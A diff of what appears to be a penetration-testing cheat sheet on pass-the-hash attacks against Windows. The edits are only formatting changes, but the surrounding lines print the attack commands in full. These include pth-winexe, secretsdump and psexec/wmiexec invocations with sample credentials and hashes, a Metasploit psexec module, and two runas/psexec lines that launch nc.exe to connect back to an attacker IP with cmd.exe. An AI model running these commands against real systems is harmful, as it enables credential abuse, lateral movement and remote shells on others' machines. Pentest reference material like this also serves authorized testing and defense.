@@ -16,19 +16,19 @@ Pass the hash remotely to gain a shell:
 
 ### pth-winexe
 
-```text
+```
 pth-winexe -U <domain>/<username>%<hash> //<target-ip> cmd
 ```
 
-Sometimes you may need to reference the target by its hostname \(add an entry to /etc/hosts to make it resolve\):
+Sometimes you may need to reference the target by its hostname (add an entry to /etc/hosts to make it resolve):
 
-```text
+```
 pth-winexe -U <domain>/<username>%<hash> //<target-hostname> cmd
 ```
 
 Alternative:
 
-```text
+```
 export SMBHASH=<hash>
 pth-winexe -U <domain>/<username>% //<target-ip> cmd
 ```
@@ -39,13 +39,13 @@ remember the first hash portion is a blank LM hash between these signs : and %
 
 ### secretsdump
 
-```text
+```
 secretsdump.py megacorp/hesher:"password123!"@192.168.56.116
 ```
 
 ### psexec.py / winexec.py
 
-```text
+```
 python psexec.py "hesher":"password123!"@192.168.56.115
 
 python psexec.py "hesher":@192.168.56.115 -hashes [nthash]
@@ -55,7 +55,7 @@ python wmiexec.py "hesher":"password123!"@192.168.56.115
 
 ### metasploit psexec
 
-```text
+```
 use exploit/windows/smb/psexec
 ```
 
@@ -63,13 +63,13 @@ use exploit/windows/smb/psexec
 
 Pass the hash locally using runas:
 
-```text
+```
 C:\Windows\System32\runas.exe /env /noprofile /user:<username> <hash> "C:\Windows\Temp\nc.exe <attacker-ip> 53 -e cmd.exe"
 ```
 
 Pass the hash locally using PowerShell:
 
-```text
+```
 secpasswd = ConvertTo-SecureString "<hash>" -AsPlainText -Force
 mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
 computer = "<hostname>"
@@ -78,17 +78,6 @@ computer = "<hostname>"
 
 Pass the hash locally using psexec:
 
-```text
+```
 psexec64 \\<hostname> -u <username> -p <hash> -h "C:\Windows\Temp\nc.exe <attacker-ip> 53 -e cmd.exe"
 ```
-
-
-
-
-
-
-
-
-
-
-
